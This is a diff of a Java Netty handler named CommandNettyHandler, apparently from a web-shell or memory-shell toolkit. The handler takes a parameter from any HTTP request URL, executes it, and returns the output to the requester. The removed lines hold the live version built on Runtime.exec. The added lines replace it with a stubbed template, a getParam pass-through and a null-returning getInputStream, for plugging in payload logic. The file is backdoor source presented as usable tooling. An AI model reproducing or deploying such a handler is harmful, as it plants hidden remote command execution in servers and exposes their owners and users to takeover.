@@ -8,6 +8,7 @@ import io.netty.channel.ChannelHandlerContext;
 import io.netty.handler.codec.http.*;
 
 import java.io.BufferedReader;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.URI;
 import java.nio.charset.StandardCharsets;
@@ -25,23 +26,23 @@ public class CommandNettyHandler extends ChannelDuplexHandler {
         if (msg instanceof HttpRequest) {
             HttpRequest request = (HttpRequest) msg;
             HttpHeaders headers = request.headers();
-            String uri = request.uri();
-            String cmd = getParameter(uri, paramName);
-            if (cmd == null) {
+            String param = getParam(getParamFromUrl(request.uri(), paramName));
+            if (param == null) {
                 ctx.fireChannelRead(msg);
                 return;
             }
             StringBuilder result = new StringBuilder();
             try {
-                Process exec = Runtime.getRuntime().exec(cmd);
-                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()))) {
+                InputStream inputStream = getInputStream(param);
+                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
                     String line;
                     while ((line = bufferedReader.readLine()) != null) {
                         result.append(line);
                         result.append(System.lineSeparator());
                     }
                 }
-            } catch (Exception ignored) {
+            } catch (Throwable e) {
+                e.printStackTrace();
             }
             send(ctx, result.toString());
         } else {
@@ -49,7 +50,14 @@ public class CommandNettyHandler extends ChannelDuplexHandler {
         }
     }
 
-    public String getParameter(String requestUrl, String paramName) throws Exception {
+    private void send(ChannelHandlerContext ctx, String context) throws Exception {
+        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(context, StandardCharsets.UTF_8));
+        response.headers().set("Content-Type", "text/plain; charset=UTF-8");
+        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
+        ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
+    }
+
+    public String getParamFromUrl(String requestUrl, String paramName) throws Exception {
         URI uri = new URI(requestUrl);
         String query = uri.getQuery();
         if (query == null) {
@@ -69,10 +77,11 @@ public class CommandNettyHandler extends ChannelDuplexHandler {
         return null;
     }
 
-    private void send(ChannelHandlerContext ctx, String context) throws Exception {
-        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(context, StandardCharsets.UTF_8));
-        response.headers().set("Content-Type", "text/plain; charset=UTF-8");
-        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
-        ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
     }
 }
